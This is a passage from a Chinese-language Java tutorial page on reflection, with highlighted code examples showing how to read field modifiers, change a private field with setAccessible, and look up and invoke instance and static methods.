&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">score&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">grade&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>一个&lt;code>Field&lt;/code>对象包含一个字段的所有信息&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;value&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 返回字段名称
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// &amp;#34;value&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 返回字段类型 是一个Class实例(比如String.class)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getType&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// class [B 表示byte[]类型
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">// 返回字段的修饰符 是一个int 不同的bit有不同的含义
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getModifiers&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isFinal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPublic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isProtected&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isPrivate&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// true
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>&lt;span style="color:#111">Modifier&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isStatic&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// false
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>用&lt;code>Field.get(Object)&lt;/code>可以获取指定实例指定字段的值；如果字段为&lt;code>private&lt;/code>可以调用&lt;code>Field.setAccessible(true)&lt;/code>，一律访问，可能会失败的原因是JVM运行期&lt;code>SecurityManager&lt;/code>可能不允许对&lt;code>java&lt;/code>和&lt;code>javax&lt;/code>开头的package的类调用&lt;code>setAccessible(true)&lt;/code>，保护JVM核心库的安全&lt;/li>
&lt;li>同样的，用&lt;code>Field.set(Object, Object)&lt;/code>可以设置字段的值，第一个&lt;code>Object&lt;/code>参数是指定的实例，第二个&lt;code>Object&lt;/code>参数是待修改的值&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Field&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#111">p&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Xiao Ming&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Xiao Ming&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getClass&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Field&lt;/span> &lt;span style="color:#111">f&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">c&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredField&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setAccessible&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">true&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 修改非public字段
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">f&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">set&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;Xiao Hong&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">p&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">());&lt;/span> &lt;span style="color:#75715e">// &amp;#34;Xiao Hong&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Person&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">name&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="调用方法">调用方法&lt;/h3>
&lt;ul>
&lt;li>&lt;code>Class&lt;/code>类提供了以下几个方法来获取方法的（返回&lt;code>Method&lt;/code>对象&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Class&lt;/span> &lt;span style="color:#111">stdClass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Student&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// 获取某个public的Method(包括父类)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getScore&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取public方法getScore，参数为String
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getName&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取继承的public方法getName，无参数
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// 获取当前类的某个Method(不包括父类)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">stdClass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getDeclaredMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;getGrade&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">));&lt;/span> &lt;span style="color:#75715e">// 获取private方法getGrade，参数为int
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getScore&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#ae81ff">99&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#75af00">getGrade&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">year&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Person&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getName&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;Person&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ul>
&lt;li>一个&lt;code>Method&lt;/code>对象包含一个方法的所有信息，函数基本同上一个三级标题&lt;/li>
&lt;li>得到&lt;code>Method&lt;/code>后我们可以对他进行调用，方式是调用其&lt;code>invoke&lt;/code>，第一个参数是对象实例，后面为可变参数，与方法参数一致&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">s&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;Hello world&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#75715e">// String对象
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;substring&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取String substring(int)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>值得注意的是，&lt;code>substring&lt;/code>自身有两个重载方法，我们获取的是其中的&lt;code>substring(int)&lt;/code>这个方法&lt;/p>
&lt;ul>
&lt;li>如果获取到的Method表示一个静态方法，调用静态方法时，由于无需指定实例对象，所以&lt;code>invoke&lt;/code>方法传入的第一个参数永远为&lt;code>null&lt;/code>&lt;/li>
&lt;/ul>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">java.lang.reflect.Method&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Method&lt;/span> &lt;span style="color:#111">m&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getMethod&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;parseInt&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 获取Integer.parseInt(String)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">Integer&lt;/span> &lt;span style="color:#111">n&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">m&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">invoke&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;12345&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// 调用
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">n&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
